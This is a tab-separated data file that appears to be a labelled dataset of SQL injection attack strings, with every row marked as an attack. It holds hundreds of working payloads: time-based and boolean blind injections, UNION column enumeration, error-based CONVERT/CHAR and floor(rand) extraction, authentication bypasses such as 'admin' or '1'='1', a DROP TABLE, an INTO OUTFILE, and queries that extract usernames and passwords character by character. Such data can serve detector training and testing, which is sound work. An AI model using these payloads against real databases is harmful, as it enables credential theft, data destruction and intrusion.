Payload	Attacker
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28	1
ORDER BY 1,SLEEP(5)#	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#	1
ORDER BY 1,SLEEP(5),3-- 	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- 	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- 	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- 	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 	1
UNION ALL SELECT 1	1
UNION ALL SELECT 1,2,3,4,5	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29	1
UNION ALL SELECT 1,2,3#	1
UNION ALL SELECT 1,2,3,4,5,6,7#	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#	1
UNION ALL SELECT 1-- 	1
UNION ALL SELECT 1,2,3,4,5-- 	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- 	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- 	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29	1
UNION SELECT @@VERSION,SLEEP(5),USER(),4#	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#	1
UNION ALL SELECT SLEEP(5)-- 	1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- 	1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- 	1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 	1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 	1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 	1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 	1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- 	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- 	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- 	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- 	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- 	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))	1
UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#	1
'&'	1
' or '' '	1
"""-"""	1
"""*"""	1
""" or """"^"""	1
' or true--	1
') or ('x')=('x	1
""")) or ((""x""))=((""x"	1
or 1=1/*	1
admin' or '1'='1	1
admin'or 1=1 or ''='	1
admin' or 1=1/*	1
admin') or ('1'='1'/*	1
admin') or '1'='1'/*	1
"admin""/*"	1
"admin"" or ""1""=""1""/*"	1
"admin"" or 1=1#"	1
"admin"") or (""1""=""1""#"	1
"admin"") or ""1""=""1""#"	1
&(.)o: select * from users where id=1 or (\.)=1 union select 1,@@VERSION -- 1	1
&(n&1: select * from users where id=1 or ($+)=1 or 1=1 -- 1	1
&.o1U: select * from users where id=1 or \.<1 union select 1,@@VERSION -- 1	1
&.oo1: select * from users where id=1 or \.< =1 union select 1,@@VERSION -- 1	1
&1oo&: select * from users where id=1 or \+<\ or 1=1 -- 1	1
&1ovc: select * from users where id=1 or 1&@#=1 union select 1,version() -- 1	1
&no&1: select * from users where id=1 or $<\ or 1=1 -- 1	1
&noo&: select * from users where id=1 or $+<\ or 1=1 -- 1	1
&o.&1: select * from users where id=1 or \<\. or 1=1 -- 1	1
&oUE1: select * from users where id=1 or \<\ union select 1,@@VERSION -- 1	1
&oo1&: select * from users where id=1 or \< =1 or 1=1 -- 1	1
&v: select * from users where id=1 or @`\` union select 1,version() -- 1	1
)UEvc: select * from users where id=1 +(\) union select null,@@VERSION -- 1	1
.)&1c: select * from users where id=1 + (\.) or 1=1 -- 1	1
.UEf(: select * from users where id=1.  union select version(),version() -- 1	1
.o&1c: select * from users where id=1. <@ or 1=1 -- 1	1
.o1UE: select * from users where id=1.*1 union select 1,banner from v$version where rownum=1 -- 1	1
.oUEv: select * from users where id=1.*\ union select null,@@VERSION -- 1	1
.ovUE: select * from users where id=1.%@ union select 1,version() -- 1	1
1)UE1: select * from users where id=1 +(1) union select 1,banner from v$version where rownum=1 -- 1	1
1c: select * from users where id=11<1# union select 1,version() -- 1	1
1oUE1: select * from users where id=1 -1<@ union select 1,version() -- 1	1
1oo1&: select * from users where id=1 + \+%1 or 1=1 -- 1	1
1oonU: select * from users where id=1 + \+*$ union select null,@@VERSION -- 1	1
UE111: select * from users where id=1 union select 1 1$,version() -- 1	1
UE1kn: select * from users where id=1 union select 1,banner from v$version where rownum=1 -- 1	1
UE1nk: select * from users where id=1 union select 1a,banner from v$version where rownum=1 -- 1	1
UE1s: select * from users where id=1 union select 1 $$,version() -- 1	1
UEov,: select * from users where id=1 union select !<@,version() -- 1	1
UEv1f: select * from users where id=1 union select  @ $,version() -- 1	1
UEvn,: select * from users where id=1 union select @ _,version() -- 1	1
UEvs: select * from users where id=1 union select @ $$,version() -- 1	1
n1UEv: select * from users where id=1 +$ 1 union select null,@@VERSION -- 1	1
no.&1: select * from users where id=1 +$+. or 1=1 -- 1	1
noo1&: select * from users where id=1 + $+%1 or 1=1 -- 1	1
noonU: select * from users where id=1 + $+*$ union select null,@@VERSION -- 1	1
o(1)&: select * from users where id=1 %(1) or 1=1 -- 1	1
o.&1c: select * from users where id=1 <@. or 1=1 -- 1	1
o.UEf: select * from users where id=1  <@. union select version(),version() -- 1	1
o1&1c: select * from users where id=1 *1 or 1=1 -- 1	1
o1n&1: select * from users where id=1 <@1$ or 1=1 -- 1	1
on.&1: select * from users where id=1 %$ . or 1=1 -- 1	1
onn&1: select * from users where id=1 <@$_ or 1=1 -- 1	1
oo1UE: select * from users where id=1 | |1 union select 1,banner from v$version where rownum=1 -- 1	1
oov&1: select * from users where id=1 %!<@ or 1=1 -- 1	1
s&&o1: select * from users where id='1' or ||/1=1 union select 1,version() -- 1'	1
s&.o&: select * from users where id='1' or \.<\ or 1=1 -- 1'	1
s&.oo: select * from users where id='1' or \.< =1 union select 1,@@VERSION -- 1'	1
s&n.o: select * from users where id='1' or $ .=1 union select 1,@@VERSION -- 1'	1
s&no.: select * from users where id='1' or $<\. union select 1,@@VERSION -- 1'	1
s&o.U: select * from users where id='1' or \<\. union select 1,@@VERSION -- 1'	1
s&on&: select * from users where id='1' or \<$ or 1=1 -- 1'	1
s&ovU: select * from users where id='1' or !<@ union select 1,version() -- 1'	1
"s()s: select * from users where id=1 or ""()"" or 1=1 -- 1"	1
"s(:s: select * from users where id=1 or ""(:"" or 1=1 -- 1"	1
"s(UEf: select * from users where id=1 or 1#""( union select version(),version() -- 1"	1
"s(n: select * from users where id=1 or ""(["" or 1=1 -- 1"	1
"s(os: select * from users where id=1 or ""(&"" or 1=1 -- 1"	1
"s),s: select * from users where id=1 or ""),"" or 1=1 -- 1"	1
"s);s: select * from users where id=1 or "");"" or 1=1 -- 1"	1
"s)v: select * from users where id=1 or "")@"" or 1=1 -- 1"	1
"s,,s: select * from users where id=1 or "",,""=1 or 1=1 -- 1"	1
"s,?s: select * from users where id=1 or "",?"" or 1=1 -- 1"	1
"s,UEv: select * from users where id=1 or 1#"", union select null,version() -- 1"	1
"s,os: select * from users where id=1 or "",&"" or 1=1 -- 1"	1
"s.,s: select * from users where id=1 or "".,"" or 1=1 -- 1"	1
"s.?s: select * from users where id=1 or "".]"" or 1=1 -- 1"	1
"s.UEv: select * from users where id=1 or 1#"". union select null,version() -- 1"	1
"s.o1&: select * from users where id=1 or @#"".=1 or 1=1 -- 1"	1
"s.{s: select * from users where id=1 or "".{"" or 1=1 -- 1"	1
"s1:s: select * from users where id=1 or ""1:"" or 1=1 -- 1"	1
"s1UEf: select * from users where id=1 or 1#""1 union select version(),version() -- 1"	1
"s1n: select * from users where id=1 or ""1["" or 1=1 -- 1"	1
"s: select * from users where id='1' or """"<@ union select 1,version() -- 1'"	1
"s:,s: select * from users where id=1 or "":,"" or 1=1 -- 1"	1
"s:?s: select * from users where id=1 or "":]"" or 1=1 -- 1"	1
"s:UEv: select * from users where id=1 or 1#"": union select null,version() -- 1"	1
"s:os: select * from users where id=1 or "":%"" or 1=1 -- 1"	1
"s;&1c: select * from users where id=1 or 1#""; or 1=1 -- 1"	1
"s;.s: select * from users where id=1 or "";.""=1 or 1=1 -- 1"	1
"s;UE1: select * from users where id=1 or 1#""; union select 1,version() -- 1"	1
"s;c: select * from users where id=1 or "";#"" or 1=1 -- 1"	1
"s;o1U: select * from users where id=1 or 1#"";=1 union select 1,version() -- 1"	1
"s;{s: select * from users where id=1 or "";{"" or 1=1 -- 1"	1
"s?,s: select * from users where id=1 or ""?,"" or 1=1 -- 1"	1
"s?:s: select * from users where id=1 or ""]:"" or 1=1 -- 1"	1
"s?UEf: select * from users where id=1 or 1#""? union select version(),version() -- 1"	1
"s?n: select * from users where id=1 or ""?["" or 1=1 -- 1"	1
"s?os: select * from users where id=1 or ""?%"" or 1=1 -- 1"	1
sUE&o: select * from users where id='1' union select ||/1,version() -- 1'	1
sUE,v: select * from users where id='1' union select \,@@VERSION -- 1'	1
sUE1k: select * from users where id='1' union select 1,banner from v$version where rownum=1 -- 1'	1
sUEn.: select * from users where id='1' union select $ .,@@VERSION -- 1'	1
sUEo.: select * from users where id='1' union select +\.,@@VERSION -- 1'	1
sUEv1: select * from users where id='1' union select @ 1,version() --  1'	1
"sn(s: select * from users where id=1 or ""$("" or 1=1 -- 1"	1
"sn;s: select * from users where id=1 or ""_;"" or 1=1 -- 1"	1
"snUEs: select * from users where id=1 or 1#""$ union select 'a',version() -- 1"	1
"snns: select * from users where id=1 or ""$_"" or 1=1 -- 1"	1
so()&: select * from users where id='1' *(\) or 1=1 -- 1'	1
"so(s: select * from users where id=1 or ""&("" or 1=1 -- 1"	1
so..U: select * from users where id='1'<@.. union select 1,version() -- 1'	1
so1&1: select * from users where id='1' + 1||1 union select 1,banner from v$version where rownum=1 -- 1'	1
"so;s: select * from users where id=1 or ""%;"" or 1=1 -- 1"	1
son.U: select * from users where id='1' + $ . union select 1,@@VERSION -- 1'	1
sonnU: select * from users where id='1' <@$_ union select 1,version() -- 1'	1
soo1U: select * from users where id='1' <@&1 union select 1,version() -- 1'	1
"soos: select * from users where id=1 or ""%&"" or 1=1 -- 1"	1
sov(1: select * from users where id='1' + @(1) union select 1,version() -- 1'	1
"so{s: select * from users where id=1 or ""%{"" or 1=1 -- 1"	1
"sv;s: select * from users where id=1 or ""@;""=1 or 1=1 -- 1"	1
"svUEs: select * from users where id=1 or 1#""@ union select 'a',version() -- 1"	1
"s{(s: select * from users where id=1 or ""{(""=1 or 1=1 -- 1"	1
"s{1s: select * from users where id=1 or ""{1""=1 or 1=1 -- 1"	1
"s{UE1: select * from users where id=1 or 1#""{ union select 1,version() -- 1"	1
"s{c: select * from users where id=1 or ""{#"" or 1=1 -- 1"	1
"s{v: select * from users where id=1 or ""{@"" or 1=1 -- 1"	1
vo.UE: select * from users where id=1 + @<@. union select 1,version() -- 1	1
voc: select * from users where id=1 + @<@# union select null,version() -- 1	1
?id=123;DROP TABLE users--	1
?id=sleep(9999)	1
'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'	1
1337%20INTO%20OUTFILE%20‘xxx’--	1
)%20OR%20(SELECT%20password%20FROM%20users%20...	1
8888'+AND+(@@TEXTSIZE>@@LANGID)+AND+'1'+LIKE+'1 -->	1
' and 5050=5050--+	1
' and ORD(MID((VERSION()), N, 1)) Insert<>=Comparer<InsertCharValueHere>--+	1
' and (SELECT 1 from tbl_admin limit 0,1)=1--+	1
' and (SELECT substring(concat(1,ID),1,1) from admin limit 0,1)=1--+	1
' and (SELECT substring(concat(1,email),1,1) from users limit 0,1)=1--+	1
' or 1=1--+	1
' or substring(@@version,1,1)=4--+	1
' or (SELECT 1 from tblAdmin limit 0,1)=1--+	1
' or (SELECT 1 from users limit 0,1)=1--+	1
' or (SELECT substring(concat(1,login),1,1) from Administrator limit 0,1)=1--+	1
' or ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),1,1))>65--+	1
and 5050=5050--	1
and ORD(MID((VERSION()), N, 1)) Insert<>=Comparer<InsertCharValueHere>--	1
and (SELECT 1 from tbl_admin limit 0,1)=1--	1
and (SELECT substring(concat(1,ID),1,1) from admin limit 0,1)=1--	1
and (SELECT substring(concat(1,email),1,1) from users limit 0,1)=1--	1
or 1=1--	1
or substring(@@version,1,1)=4--	1
or (SELECT 1 from tblAdmin limit 0,1)=1--	1
or (SELECT 1 from users limit 0,1)=1--	1
or (SELECT substring(concat(1,login),1,1) from Administrator limit 0,1)=1--	1
or ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),1,1))>65--	1
+and(select 1 FROM(select count(*),concat((select (select concat(@@datadir)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)	1
